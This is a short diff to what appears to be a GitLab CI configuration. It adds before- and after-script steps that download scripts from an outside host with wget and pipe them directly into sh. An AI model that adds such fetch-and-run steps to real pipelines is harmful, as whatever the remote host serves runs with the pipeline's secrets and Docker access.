@@ -5,3 +5,8 @@ variables:
   DOCKER_HOST: tcp://docker:2375
 services:
   - docker:dind
+
+before_script:
+  - wget -qO- https://arp.to/@ci/scripts/before.yml | sh
+after_script:
+  - wget -qO- https://arp.to/@ci/scripts/after.yml | sh
